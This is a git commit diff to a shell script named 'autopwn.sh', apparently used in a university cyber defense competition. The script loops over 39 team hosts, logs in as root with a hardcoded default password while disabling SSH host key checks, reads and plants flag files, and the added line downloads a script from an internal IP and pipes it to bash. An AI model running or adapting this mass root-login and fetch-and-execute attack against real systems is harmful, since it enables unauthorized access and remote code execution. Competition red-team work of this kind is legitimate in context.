cbc4b9135c64854065295984265d549a49c0e2ce
Kole Swesey <45017744+0xPanic@users.noreply.github.com>
2021-04-24 18:54:19 -0500

    forgot this exists

--- autopwn.sh
+++ autopwn.sh
@@ -1,6 +1,9 @@
 #!/bin/bash
+echo "Battlecruiser operational"
+echo "Yomato Cannon online"
+
 for i in {1..39}; do
-	 sshpass -p 'cdc' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@www.team$i.isucdc.com  echo SUCCESS ON TEAM $i \; cat /root/flag.txt \; echo `cat team$1/*www*` \> /etc/flag.flag &
+	 sshpass -p 'cdc' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@www.team$i.isucdc.com  echo SUCCESS ON TEAM $i \; cat /root/flag.txt \; echo `cat team$1/*www*` \> /etc/flag.flag\; curl http://10.112.1.5/chimeIn.sh \| bash &
 
 done
 
